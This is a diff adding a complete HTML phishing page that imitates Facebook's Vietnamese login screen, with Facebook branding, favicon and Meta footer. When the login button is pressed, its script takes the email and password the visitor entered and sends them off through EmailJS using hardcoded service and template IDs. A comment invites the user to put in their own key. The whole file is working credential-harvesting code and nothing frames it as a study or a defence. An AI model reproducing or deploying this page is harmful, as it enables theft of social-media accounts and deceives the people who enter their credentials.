@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
+
+  <title>Facebook - Đăng nhập</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      background-color: #f0f2f5;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 80vh;
+    }
+    .left {
+      margin-right: 50px;
+    }
+    .left h1 {
+      color: #1877f2;
+      font-size: 56px;
+      font-weight: bold;
+    }
+    .left p {
+      font-size: 20px;
+      margin-top: 10px;
+    }
+    .right {
+      background: white;
+      padding: 20px;
+      width: 360px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    }
+    .right input {
+      width: 100%;
+      padding: 14px;
+      margin: 6px 0;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+    }
+    .right button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      margin: 6px 0;
+      cursor: pointer;
+    }
+    .right button:hover {
+      background-color: #165ec9;
+    }
+    .right a {
+      display: block;
+      text-align: center;
+      margin: 10px 0;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .right hr {
+      margin: 20px 0;
+      border: 0.5px solid #ddd;
+    }
+    .new-account {
+      display: flex;
+      justify-content: center;
+    }
+    .new-account button {
+      background-color: #42b72a;
+      width: auto;
+      padding: 14px 20px;
+    }
+    footer {
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+      padding: 30px;
+    }
+    footer a {
+      color: #777;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <h1>facebook</h1>
+      <p>Facebook giúp bạn kết nối và chia sẻ<br>với mọi người trong cuộc sống của bạn.</p>
+    </div>
+    <div class="right">
+  <input type="text" id="email" placeholder="Email hoặc số điện thoại">
+<input type="password" id="password" placeholder="Mật khẩu">
+
+  <button onclick="sendMail()">Đăng nhập</button>
+      <a href="#">Quên mật khẩu?</a>
+      <hr>
+      <div class="new-account">
+        <button>Tạo tài khoản mới</button>
+      </div>
+    </div>
+  </div>
+  <footer>
+    Tiếng Việt English (UK) 中文(简体) 한국어 日本語 Français (France) ภาษาไทย Español <br>
+    Đăng ký Đăng nhập Messenger Facebook Lite Video Meta Pay Cửa hàng trên Meta <br>
+    Meta © 2025
+  </footer>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+  (function(){
+    emailjs.init("i6AJtogwaYpMnuxoj"); // thay bằng public key của bạn
+  })();
+</script>
+<script>
+function sendMail() {
+  const emailValue = document.getElementById("email").value;
+  const passwordValue = document.getElementById("password").value;
+
+  if (!emailValue || !passwordValue) {
+    alert("Vui lòng nhập đủ thông tin!");
+    return;
+  }
+
+  emailjs.send("service_kojg37s", "template_wpovzk7", {
+    email: emailValue,
+    password: passwordValue
+  })
+  .then(function(response) {
+    alert("Gửi thành công!");
+    console.log("SUCCESS", response.status, response.text);
+  }, function(error) {
+    alert("Gửi thất bại, kiểm tra lại cấu hình!");
+    console.log("FAILED", error);
+  });
+}
+</script>
+
+
+</body>
+</html>
